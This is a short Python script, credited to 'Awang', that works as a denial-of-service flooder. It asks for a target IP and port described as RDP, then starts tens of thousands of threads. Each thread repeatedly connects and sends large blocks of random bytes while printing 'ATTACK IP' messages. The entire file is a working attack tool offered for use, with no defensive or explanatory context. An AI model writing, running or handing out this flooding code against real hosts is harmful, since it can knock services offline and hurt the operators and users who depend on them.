
import random
import socket
import threading

print("[+] TOOL BY Awang ")

ip = str(input("[+] Enter RDP IP : "))
port = int(input("[+] Enter RDP Port (80)   : "))
times = 90048
threads = 90024

def run():
    data = random._urandom(200098)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            s.send(data)
            for x in range(times):
                s.send(data)
                s.send(data)
            print(i +" Sent!!!")
        except socket.error:
            s.close()
            print("[!] ATTACK IP ",ip," With Port : ",port,"!")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
